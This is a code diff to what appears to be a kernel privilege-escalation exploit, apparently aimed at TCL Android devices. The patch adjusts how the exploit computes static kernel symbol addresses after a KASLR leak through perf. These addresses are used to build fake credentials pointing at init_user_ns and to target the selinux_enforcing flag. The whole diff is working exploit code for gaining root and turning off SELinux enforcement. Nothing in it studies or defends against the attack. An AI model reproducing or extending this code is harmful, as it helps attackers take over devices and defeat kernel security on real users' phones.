@@ -1658,6 +1658,19 @@ static int perf_leak_init_user_ns(uintptr_t task, uintptr_t *out) {
   return got;
 }
 
+/* The exact TCL image keeps static text/data symbols at the canonical
+ * kimage alias.  Perf may also report a linear/trampoline alias whose 2 MiB
+ * block changes between samples; that alias must never be used to build
+ * persistent pointers inside fake credentials.  The exact vmlinux proves
+ * init_cred+cred.user_ns contains canonical &init_user_ns. */
+static uintptr_t runtime_static_symbol_base(void) {
+  if (active_offsets &&
+      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
+      active_offsets->kimage_text_base)
+    return active_offsets->kimage_text_base;
+  return kaslr_base;
+}
+
 /* perf_find_task - only used when perf is available (shell context) */
 static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
@@ -1741,7 +1754,8 @@ static uintptr_t perf_find_task(void) {
  * -20, which the later threads inherit and which protects the critical
  * discard->capture window from preemption. */
 static int validate_device_symbol_layout(void) {
-  uintptr_t want = kaslr_base + active_offsets->off_init_user_ns;
+  uintptr_t want = runtime_static_symbol_base() +
+                   active_offsets->off_init_user_ns;
   uintptr_t cands[MAX_NS_CANDS];
   int n = perf_leak_init_user_ns(g_leaked_task, cands);
   g_ns_cand_count = 0;
@@ -2192,11 +2206,13 @@ static int run_cred_swap(void) {
      * here or every capable() call fails (CAP_DAC_OVERRIDE, CAP_SYSLOG,
      * ...) and the rooted thread cannot create files or exec. */
     if (active_offsets->off_init_user_ns_device && kaslr_done) {
-      g_init_user_ns_addr = kaslr_base +
+      uintptr_t symbol_base = runtime_static_symbol_base();
+      g_init_user_ns_addr = symbol_base +
                            active_offsets->off_init_user_ns_device;
-      pr_info("device &init_user_ns = %016lx (anchor+%016lx) - "
+      pr_info("device &init_user_ns = %016lx (symbol_base=%016lx +%016lx) - "
               "fake_cred->user_ns\n",
               (unsigned long)g_init_user_ns_addr,
+              (unsigned long)symbol_base,
               (unsigned long)active_offsets->off_init_user_ns_device);
     } else {
       g_init_user_ns_addr = 0;
@@ -2204,7 +2220,7 @@ static int run_cred_swap(void) {
   }
   if (active_offsets->off_selinux_enforcing_device && kaslr_done &&
       env_flag("GHOST_SELINUX", 1)) {
-    g_selinux_target = kaslr_base +
+    g_selinux_target = runtime_static_symbol_base() +
                       active_offsets->off_selinux_enforcing_device;
     if ((g_selinux_target & 7) == 0) {
       /* Pair-agreement diagnostic: &selinux_avc sits exactly 0x1828
